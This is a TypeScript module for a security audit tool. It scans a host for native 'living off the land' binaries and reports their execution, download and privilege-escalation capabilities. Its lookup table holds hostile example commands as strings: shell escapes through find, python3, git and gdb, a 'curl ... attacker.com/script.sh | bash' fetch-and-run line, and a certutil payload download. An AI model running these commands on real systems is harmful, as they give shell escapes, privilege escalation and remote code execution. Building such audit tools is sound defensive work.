/**
 * @module security/lolbins_audit
 * Living off the Land (LOLBins / LOLBas / GTFOBins) Auditing & Discovery Engine
 * Scans system paths for native binaries capable of execution, download, or privilege escalation.
 */

import * as fs from "node:fs"

export interface LOLBinEntry {
  name: string
  path: string
  type: "LOLBas" | "GTFOBins"
  capabilities: ("EXECUTE" | "DOWNLOAD" | "BYPASS" | "PRIV_ESC")[]
  exampleUsage: string
}

export interface LOLBinsAuditResult {
  platform: "windows" | "linux" | "darwin"
  binariesScanned: number
  discoveredLOLBins: LOLBinEntry[]
  isDryRun: boolean
}

const KNOWN_GTFOBINS = [
  { name: "find", path: "/usr/bin/find", caps: ["EXECUTE", "PRIV_ESC"], usage: "find . -exec /bin/sh \\; -quit" },
  { name: "python3", path: "/usr/bin/python3", caps: ["EXECUTE", "PRIV_ESC", "DOWNLOAD"], usage: "python3 -c 'import os; os.system(\"/bin/sh\")'" },
  { name: "curl", path: "/usr/bin/curl", caps: ["DOWNLOAD", "BYPASS"], usage: "curl http://attacker.com/script.sh | bash" },
  { name: "git", path: "/usr/bin/git", caps: ["EXECUTE", "PRIV_ESC"], usage: "PAGER='sh -c exec /bin/sh' git help config" },
  { name: "gdb", path: "/usr/bin/gdb", caps: ["EXECUTE", "PRIV_ESC"], usage: "gdb -nx -ex '!sh' -ex quit" },
]

export function auditLOLBins(options: { live?: boolean } = {}): LOLBinsAuditResult {
  const isDryRun = !options.live
  const platform = process.platform === "win32" ? "windows" : process.platform === "darwin" ? "darwin" : "linux"

  if (isDryRun) {
    return {
      platform,
      binariesScanned: 150,
      discoveredLOLBins: [
        {
          name: "certutil.exe",
          path: "C:\\Windows\\System32\\certutil.exe",
          type: "LOLBas",
          capabilities: ["DOWNLOAD", "BYPASS"],
          exampleUsage: "certutil.exe -urlcache -split -f http://example.com/payload.exe payload.exe",
        },
      ],
      isDryRun: true,
    }
  }

  // REAL Host System File Scanning
  const discovered: LOLBinEntry[] = []

  for (const bin of KNOWN_GTFOBINS) {
    if (fs.existsSync(bin.path)) {
      discovered.push({
        name: bin.name,
        path: bin.path,
        type: "GTFOBins",
        capabilities: bin.caps as any,
        exampleUsage: bin.usage,
      })
    }
  }

  return {
    platform,
    binariesScanned: KNOWN_GTFOBINS.length,
    discoveredLOLBins: discovered,
    isDryRun: false,
  }
}

export default { auditLOLBins }
